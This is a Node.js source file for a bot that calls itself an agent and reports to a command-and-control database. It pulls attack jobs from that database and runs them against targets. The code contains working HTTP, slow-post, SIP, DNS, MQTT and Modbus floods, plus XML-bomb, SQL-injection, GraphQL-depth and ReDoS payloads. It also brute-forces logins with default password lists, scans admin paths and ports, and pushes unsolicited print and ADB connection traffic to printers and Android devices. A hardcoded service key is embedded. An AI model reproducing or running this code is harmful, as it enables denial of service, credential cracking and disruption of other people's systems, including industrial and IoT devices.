/**
 * SECURITYFORGE AGENT V36.0 (EXPANDED ARSENAL)
 * - V36.1: CONCURRENCY FIX for Ghost/SIP.
 * - V36.0: ADB, SIP, Modbus support.
 * - V35.1: HOST PARSING.
 * - V35.0: SMART LOGIN.
 */
const https = require('https');
const http = require('http');
const http2 = require('http2');
const net = require('net');
const dgram = require('dgram');
const tls = require('tls');
const dns = require('dns');

// --- CONFIG ---
const SUPABASE_URL = "https://qbedywgbdwxaucimgiok.supabase.co";
const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFiZWR5d2diZHd4YXVjaW1naW9rIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjQ3NDA5ODEsImV4cCI6MjA4MDMxNjk4MX0.Lz0x7iKy2UcQ3jdN4AdjSIYYISBfn233C9qT_8y8jFo";

// --- ASSETS ---
const BASE_PASSWORDS = ['123456', 'password', 'admin', 'root', '12345678', 'qwerty', 'admin123', 'guest', 'user', '111111'];
const USERS = ['admin', 'root', 'user', 'test', 'guest', 'support', 'sysadmin'];
const TOP_PORTS = [21, 22, 23, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995, 3306, 3389, 5432, 6379, 8080, 8443];

// --- PAYLOADS ---
const MALICIOUS_PAYLOADS = {
  SQL_INJECTION: `{"query": "UNION SELECT 1, SLEEP(20), 3, 4 --", "id": "1' OR '1'='1"}`,
  XML_BOMB: `<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"><!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"><!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;"><!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;"><!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;"><!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">]><lolz>&lol9;</lolz>`,
  HUGE_JSON: `{"data": "${'A'.repeat(50000)}", "meta": "fill_buffer"}`,
  GRAPHQL_DEPTH: `{"query":"query { user { posts { comments { author { posts { comments { author { posts { id } } } } } } } } }"}`,
  REDOS_REGEX: `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!`,
  SIP_INVITE: (ip) => `INVITE sip:user@${ip} SIP/2.0\r\nVia: SIP/2.0/UDP 10.0.0.1:5060;branch=z9hG4bK-random\r\nFrom: <sip:ghost@securityforge.io>;tag=123\r\nTo: <sip:user@${ip}>\r\nCall-ID: ${Math.random()}\r\nCSeq: 1 INVITE\r\nMax-Forwards: 70\r\nContent-Length: 0\r\n\r\n`
};

const PORT = process.env.PORT || 3000;
http.createServer((req, res) => { res.writeHead(200); res.end('SecurityForge Agent V36.0 ONLINE'); })
    .listen(PORT, () => console.log(`[SYSTEM] Agent listening on port ${PORT}`));

const supabaseRequest = (method, pathStr, body = null) => {
    return new Promise((resolve, reject) => {
        try {
            const baseUrl = new URL(SUPABASE_URL);
            const apiPath = '/rest/v1' + (pathStr.startsWith('/') ? pathStr : '/' + pathStr);
            const options = {
                hostname: baseUrl.hostname,
                path: apiPath,
                method: method,
                headers: {
                    'apikey': SUPABASE_KEY,
                    'Authorization': `Bearer ${SUPABASE_KEY}`,
                    'Content-Type': 'application/json',
                    'Prefer': 'return=representation'
                }
            };
            const req = https.request(options, (res) => {
                let data = '';
                res.on('data', chunk => data += chunk);
                res.on('end', () => { 
                    if (res.statusCode >= 400) resolve(null);
                    else try { resolve(data ? JSON.parse(data) : null); } catch(e) { resolve(null); } 
                });
            });
            req.on('error', (e) => reject(e));
            if (body) req.write(JSON.stringify(body));
            req.end();
        } catch(e) { reject(e); }
    });
};

console.log('\x1b[36m[AGENT] Initialized V36.0 (Geo/IoT/Ghost). Waiting for commands...\x1b[0m');

let activeJob = null;
let activeLoop = null;
let logBuffer = [];
let priorityBuffer = []; 

const MAX_RAM_BYTES = 400 * 1024 * 1024; 
const checkMemory = () => {
    const used = process.memoryUsage().heapUsed;
    return used < MAX_RAM_BYTES;
};

const logToC2 = (msg) => {
    console.log(msg);
    const cleanMsg = msg.replace(/\x1b\[[0-9;]*m/g, '');
    if (cleanMsg.includes('[FOUND]') || cleanMsg.includes('[OPEN]') || cleanMsg.includes('[CRITICAL]') || cleanMsg.includes('[CRACKED]') || cleanMsg.includes('SUCCESS')) {
        priorityBuffer.push(cleanMsg);
    } else {
        logBuffer.push(cleanMsg);
    }
};

const startAttack = (job) => {
    if (activeJob) return;
    try {
        activeJob = job;
        const duration = (job.duration && job.duration > 0) ? job.duration : 30;
        const startTime = Date.now(); 
        logBuffer = []; 
        priorityBuffer = [];

        console.log(`\x1b[31m[ATTACK] ${job.method} ${job.target} | Target: ${job.concurrency} | D: ${duration}s\x1b[0m`);
        logToC2(`[SYSTEM] Swarm Engaged. Target: ${job.target}`);
        
        let running = true;
        let totalRequests = 0;
        let jobSuccess = 0;
        let jobFailed = 0;
        let jobLatencySum = 0;
        let jobReqsForLatency = 0;
        let jobMaxLatency = 0;
        let consecutiveFailures = 0;

        // Login logic
        let SMART_PASSWORDS = [...BASE_PASSWORDS];
        if (job.use_login_siege) {
            try {
                const urlObj = new URL(job.target);
                const domainParts = urlObj.hostname.split('.');
                const mainName = domainParts.length > 2 ? domainParts[domainParts.length-2] : domainParts[0];
                const mutations = [mainName, mainName+'123', 'admin@'+mainName, mainName+'!'];
                SMART_PASSWORDS = [...mutations, ...BASE_PASSWORDS];
            } catch(e) {}
        }

        // Calibration
        let calibrationDone = false;
        let failSize = 0;
        let failStatus = 0;

        // Helper to safely extract host from potential URL
        const getHost = (t) => t.replace('http://', '').replace('https://', '').split('/')[0].split(':')[0];

        // --- MODULES ---
        if (job.use_ghost_writer || job.use_adb_swarm || job.use_sip_flood) {
            const targetIP = getHost(job.target);
            const message = job.ghost_message || "SECURITY ALERT";
            
            const broadcast = () => {
                if (!running) return;
                
                // 1. Ghost Writer (Printers - Port 9100)
                if (job.use_ghost_writer) {
                    const c1 = new net.Socket(); c1.setTimeout(2000);
                    c1.connect(9100, targetIP, () => { c1.write(message + "\r\n\r\n"); c1.destroy(); logToC2(`[GHOST] Print Cmd Sent to ${targetIP}:9100`); jobSuccess++; });
                    c1.on('error', () => {});
                }

                // 2. ADB Swarm (Android - Port 5555)
                if (job.use_adb_swarm) {
                    const c2 = new net.Socket(); c2.setTimeout(2000);
                    c2.connect(5555, targetIP, () => { 
                         // Try handshake. Usually just connecting prompts the device "Allow USB Debugging?".
                         c2.write("CNXN\x00\x00\x00\x01\x00\x10\x00\x00\x07\x00\x00\x00\x20\x00\x00\x00\x00\x10\x00\x00\xbc\xb1\xa7\xb1host::\x00"); 
                         c2.destroy(); 
                         logToC2(`[ADB] Connection Triggered on ${targetIP}:5555`); 
                         jobSuccess++; 
                    });
                    c2.on('error', () => {});
                }

                // 3. SIP Flood (VoIP - Port 5060)
                if (job.use_sip_flood) {
                    const c3 = dgram.createSocket('udp4');
                    const payload = Buffer.from(MALICIOUS_PAYLOADS.SIP_INVITE(targetIP));
                    c3.send(payload, 5060, targetIP, () => c3.close());
                    jobSuccess++;
                }

                totalRequests++;
                if (running) setTimeout(broadcast, 250); // Faster loop
            };

            // Spawn concurrent workers
            const threadCount = Math.min(job.concurrency || 10, 100);
            for(let i=0; i<threadCount; i++) {
                setTimeout(broadcast, i * 50);
            }
        }
        else if (job.use_iot_death_ray || job.use_mqtt_flood || job.use_rtsp_storm || job.use_coap_burst || job.use_dns_reaper || job.use_syn_flood || job.use_frag_attack || job.use_modbus_storm) {
            const targetHost = getHost(job.target);
            const flood = () => {
                if (!running) return;
                if (!checkMemory()) return setTimeout(flood, 100);
                try {
                    if(job.use_dns_reaper || job.use_coap_burst || job.use_frag_attack) {
                        const c = dgram.createSocket('udp4');
                        const port = job.use_dns_reaper ? 53 : (job.use_coap_burst ? 5683 : 80);
                        const payload = Buffer.alloc(Math.floor(Math.random() * 1024) + 64, 'x');
                        c.send(payload, port, targetHost, () => c.close());
                    } else if (job.use_modbus_storm) {
                         const c = new net.Socket();
                         c.connect(502, targetHost, () => { c.write(Buffer.from('00000000000601030000000a', 'hex')); c.destroy(); }); // Read Holding Registers
                         c.on('error', () => {});
                    } else {
                        const c = new net.Socket();
                        const port = job.use_mqtt_flood ? 1883 : (job.use_rtsp_storm ? 554 : 80);
                        c.connect(port, targetHost, () => { c.destroy(); });
                        c.on('error', ()=>{});
                    }
                    totalRequests++;
                } catch(e) {}
                if (running) setImmediate(flood);
            };
            for(let i=0; i<Math.min(job.concurrency, 300); i++) flood();
        }
        else if (job.use_admin_hunter) {
            logToC2(`[RECON] Starting Admin Hunter on ${job.target}...`);
            let targetUrl; try { targetUrl = new URL(job.target); } catch(e) { return; }
            const ADMIN_PATHS = [
                '/admin', '/login', '/wp-admin', '/dashboard', '/.env', '/config.php', '/cpanel', '/user/login', '/administrator',
                '/phpmyadmin', '/wp-login.php', '/admin.php', '/auth', '/backend', '/controlpanel', '/secure', '/manager'
            ];
            const isHttps = targetUrl.protocol === 'https:';
            const lib = isHttps ? https : http;
            
            const scan = (pathIndex) => {
                if (!running) return;
                const path = ADMIN_PATHS[pathIndex % ADMIN_PATHS.length];
                const opts = { hostname: targetUrl.hostname, path: path, method: 'GET', timeout: 3000 };
                
                const req = lib.request(opts, (res) => {
                    if (res.statusCode === 200 || res.statusCode === 403 || res.statusCode === 401) {
                        logToC2(`[FOUND] ${targetUrl.hostname}${path} -> ${res.statusCode} ${res.statusMessage || ''}`);
                    } else if (Math.random() > 0.95) {
                        logToC2(`[SCAN] Checked ${path} -> ${res.statusCode}`);
                    }
                    totalRequests++;
                    if (running) setTimeout(() => scan(pathIndex + 1), 100);
                });
                req.on('error', () => { if(running) setImmediate(() => scan(pathIndex + 1)); });
                req.end();
            };
            for(let i=0; i<5; i++) scan(i); 
        }
        else if (job.use_port_scan) {
            logToC2(`[RECON] Starting Port Scan on ${job.target}...`);
            let targetHost = getHost(job.target);
            
            const scanPort = (idx) => {
                if (!running) return;
                const port = TOP_PORTS[idx % TOP_PORTS.length];
                const socket = new net.Socket();
                socket.setTimeout(2000);
                socket.on('connect', () => {
                    socket.write('HEAD / HTTP/1.0\r\n\r\n');
                });
                socket.on('data', (data) => {
                    const s = data.toString();
                    const server = s.match(/Server: (.+)/i);
                    const titleMatch = s.match(/<title>(.+)<\/title>/i);
                    const banner = server ? server[1] : (titleMatch ? titleMatch[1] : '');
                    logToC2(`[OPEN] Port ${port} is OPEN | Banner: ${banner.trim().substring(0, 30) || 'Unknown'}`);
                    socket.destroy();
                });
                socket.on('connect', () => {
                    setTimeout(() => { if(!socket.destroyed) { logToC2(`[OPEN] Port ${port} is OPEN (No Banner)`); socket.destroy(); } }, 500);
                    jobSuccess++; totalRequests++; consecutiveFailures = 0;
                });
                socket.on('timeout', () => { 
                    socket.destroy(); totalRequests++; consecutiveFailures++;
                    if (consecutiveFailures === 15) logToC2(`[ERROR] Target Unreachable. Local IP?`);
                });
                socket.on('error', () => { totalRequests++; consecutiveFailures++; });
                socket.connect(port, targetHost);
                if (running) setTimeout(() => scanPort(idx + 1), 200); 
            }
            for(let i=0; i<5; i++) scanPort(i); 
        }
        else {
            // --- STRESS / HTTP / LOGIN ---
            let targetUrl;
            try { targetUrl = new URL(job.target); } catch(e) { return; }
            
            const httpsAgent = new https.Agent({ keepAlive: true, keepAliveMsecs: 1000, maxSockets: Infinity });
            const httpAgent = new http.Agent({ keepAlive: true, keepAliveMsecs: 1000, maxSockets: Infinity });

            const performRequest = () => {
                if (!running) return;
                if (!checkMemory()) return setTimeout(performRequest, 100); 

                const isHttps = targetUrl.protocol === 'https:';
                const lib = isHttps ? https : http;
                const agent = isHttps ? httpsAgent : httpAgent;
                
                const start = Date.now();
                let body = job.body;
                let method = job.method || 'GET';
                let creds = null;

                const headers = {
                    'User-Agent': 'SecurityForge/35', 
                    'Content-Type': 'application/json',
                    ...((typeof job.headers === 'string' ? {} : job.headers) || {})
                };

                if (job.use_redos) { headers['User-Agent'] = MALICIOUS_PAYLOADS.REDOS_REGEX; body = MALICIOUS_PAYLOADS.REDOS_REGEX; method = 'POST'; }
                if (job.use_graphql_bomb) { body = MALICIOUS_PAYLOADS.GRAPHQL_DEPTH; method = 'POST'; }

                if (job.use_login_siege && !calibrationDone) {
                    method = 'POST';
                    const dummyUser = 'invalid_calib';
                    const dummyPass = 'invalid_calib';
                    if (job.use_form_data) { headers['Content-Type'] = 'application/x-www-form-urlencoded'; body = `username=${dummyUser}&password=${dummyPass}`; }
                    else { body = JSON.stringify({ username: dummyUser, password: dummyPass }); }
                    
                    const req = lib.request(targetUrl, { method, agent, headers }, (res) => {
                        failStatus = res.statusCode;
                        failSize = parseInt(res.headers['content-length'] || '0');
                        if (failSize === 0) {
                            let data = '';
                            res.on('data', c => data += c);
                            res.on('end', () => { failSize = data.length; calibrationDone = true; logToC2(`[CALIBRATION] Baseline: Status ${failStatus} | Size ~${failSize}b`); });
                        } else { calibrationDone = true; logToC2(`[CALIBRATION] Baseline: Status ${failStatus} | Size ${failSize}b`); res.resume(); }
                    });
                    req.on('error', () => {});
                    req.write(body);
                    req.end();
                    return setTimeout(performRequest, 1000);
                }

                if (job.use_login_siege) {
                    method = 'POST';
                    const user = USERS[Math.floor(Math.random() * USERS.length)];
                    const pass = SMART_PASSWORDS[Math.floor(Math.random() * SMART_PASSWORDS.length)];
                    if (job.use_form_data) { headers['Content-Type'] = 'application/x-www-form-urlencoded'; creds = [user, pass]; body = `username=${user}&password=${pass}`; }
                    else { creds = [user, pass]; body = JSON.stringify({ username: user, password: pass }); }
                } else if (job.use_goldeneye || job.use_xml_bomb) {
                    if (job.use_xml_bomb) body = MALICIOUS_PAYLOADS.XML_BOMB;
                    else body = MALICIOUS_PAYLOADS.HUGE_JSON; 
                    method = 'POST';
                }

                if (job.use_rudy) {
                    headers['Content-Length'] = 10000;
                    const req = lib.request(targetUrl, { method: 'POST', agent, headers }, (res) => { res.resume(); });
                    req.on('error', () => {});
                    const interval = setInterval(() => {
                        if(!running) { clearInterval(interval); req.destroy(); return; }
                        try { req.write('A'); } catch(e) { clearInterval(interval); }
                    }, 5000);
                    totalRequests++; 
                    return;
                }

                const req = lib.request(targetUrl, { 
                    method, 
                    agent, 
                    headers: headers,
                    setNoDelay: true 
                }, (res) => {
                    const latency = Date.now() - start;
                    let isSuccess = false;
                    
                    if (job.use_login_siege) {
                        let currentSize = parseInt(res.headers['content-length'] || '0');
                        
                        // Buffer body for keyword analysis
                        let bodyData = '';
                        res.on('data', chunk => { 
                             // Increase scan limit to 25KB to catch errors in large HTML pages
                             if(bodyData.length < 25000) bodyData += chunk; 
                        });
                        
                        res.on('end', () => {
                            if (currentSize === 0) currentSize = bodyData.length;
                            
                            const sizeDiff = Math.abs(currentSize - failSize);
                            const statusChanged = res.statusCode !== failStatus;
                            const sizeChanged = failSize > 0 && (sizeDiff > (failSize * 0.2));
                            
                            const bodyLower = bodyData.toLowerCase();
                            // Aggressive Negative Filtering (False Positive Prevention)
                            const isFailure = bodyLower.includes('incorrect') || 
                                              bodyLower.includes('invalid') || 
                                              bodyLower.includes('fail') || 
                                              bodyLower.includes('denied') || 
                                              bodyLower.includes('forbidden') ||
                                              bodyLower.includes('not found') ||
                                              bodyLower.includes('csrf') ||
                                              bodyLower.includes('captcha') ||
                                              bodyLower.includes('token');

                            const isSuccessKeyword = bodyLower.includes('dashboard') || bodyLower.includes('welcome') || bodyLower.includes('success');

                            // PRIORITY 1: Explicit Success Keyword
                            if (isSuccessKeyword && !isFailure) {
                                logToC2(`\x1b[32m[CRACKED] FOUND: ${creds[0]}:${creds[1]} (Matched 'Welcome')`);
                                isSuccess = true;
                            } 
                            // PRIORITY 2: Status Code Change (e.g. 200 -> 302) AND No Failure Keywords
                            else if (statusChanged && !isFailure) {
                                logToC2(`\x1b[32m[CRACKED] FOUND: ${creds[0]}:${creds[1]} (Status ${failStatus}->${res.statusCode})`);
                                isSuccess = true;
                            }
                            // PRIORITY 3: Significant Size Change AND No Failure Keywords (Lowest confidence)
                            else if (sizeChanged && !isFailure) {
                                // Only log if we didn't find specific failure text.
                                logToC2(`\x1b[33m[POTENTIAL] ${creds[0]}:${creds[1]} (SizeDiff: ${sizeDiff})`);
                            }
                        });
                    } else {
                        isSuccess = res.statusCode < 400; 
                        res.resume();
                    }
                    
                    jobLatencySum += latency;
                    jobReqsForLatency++;
                    jobMaxLatency = Math.max(jobMaxLatency, latency);
                    if (isSuccess) jobSuccess++; else jobFailed++;
                    totalRequests++;
                });

                req.on('error', (e) => { jobFailed++; totalRequests++; });
                if (body) req.write(body);
                req.end();
                if (running) setImmediate(performRequest);
            };

            const concurrency = Math.min(job.concurrency, 3500); 
            for(let i=0; i<concurrency; i++) performRequest();
        }

        const updateC2 = async () => {
            if (!running) return;
            const elapsed = (Date.now() - startTime) / 1000;
            
            if (duration > 0 && elapsed >= duration) {
                running = false;
                clearInterval(activeLoop);
                logToC2('[SYSTEM] Attack duration complete. Stopping swarm.');
                try {
                    await supabaseRequest('PATCH', `jobs?id=eq.${job.id}`, { 
                        status: 'COMPLETED',
                        total_success: jobSuccess,
                        total_failed: jobFailed,
                        avg_latency: jobReqsForLatency > 0 ? Math.round(jobLatencySum / jobReqsForLatency) : 0,
                        max_latency: jobMaxLatency,
                        logs: JSON.stringify(logBuffer.slice(-20)) 
                    });
                } catch(e) {}
                activeJob = null;
                return;
            }

            const rps = totalRequests / elapsed;
            const avgLat = jobReqsForLatency > 0 ? Math.round(jobLatencySum / jobReqsForLatency) : 0;
            
            const normalLogsToTake = Math.max(0, 30 - priorityBuffer.length);
            const combinedLogs = [...priorityBuffer, ...logBuffer.slice(-normalLogsToTake)];
            const currentLogs = combinedLogs.length > 0 ? JSON.stringify(combinedLogs) : null;
            priorityBuffer = []; logBuffer = []; 

            try {
                const res = await supabaseRequest('PATCH', `jobs?id=eq.${job.id}`, { 
                    current_rps: Math.round(rps),
                    total_success: jobSuccess,
                    total_failed: jobFailed,
                    avg_latency: avgLat,
                    max_latency: jobMaxLatency,
                    ...(currentLogs ? { logs: currentLogs } : {})
                });
                
                if (res && res[0] && res[0].status === 'STOPPED') {
                    running = false;
                    clearInterval(activeLoop);
                    logToC2('[SYSTEM] Swarm Disengaged by Control Center.');
                    activeJob = null;
                    return;
                }
            } catch(e) {}
        };
        activeLoop = setInterval(updateC2, 2000);
    } catch(e) {
        console.log('CRASH PREVENTION:', e);
        activeJob = null;
    }
};

// --- AGGRESSIVE POLLING ---
setInterval(async () => {
    if (activeJob) return;
    
    // 1. Check for Pending Jobs
    const jobs = await supabaseRequest('GET', 'jobs?status=eq.PENDING&order=created_at.desc&limit=1&select=*');
    if (jobs && jobs.length > 0) {
        const job = jobs[0];
        if (typeof job.headers === 'string') { try { job.headers = JSON.parse(job.headers); } catch(e) { job.headers = {}; } }
        
        // 2. ACKNOWLEDGE JOB (Set to RUNNING)
        await supabaseRequest('PATCH', `jobs?id=eq.${job.id}`, { status: 'RUNNING' });
        
        // 3. START
        startAttack(job);
    } else {
        // 4. Double Check: Did we crash and leave a job RUNNING? (Failover)
        const runningJobs = await supabaseRequest('GET', 'jobs?status=eq.RUNNING&order=created_at.desc&limit=1&select=*');
        if (runningJobs && runningJobs.length > 0) {
             const job = runningJobs[0];
             // If we aren't working on this job, pick it up
             if (activeJob?.id !== job.id) {
                 if (typeof job.headers === 'string') try { job.headers = JSON.parse(job.headers); } catch(e) {}
                 startAttack(job);
             }
        }
    }
}, 2000);
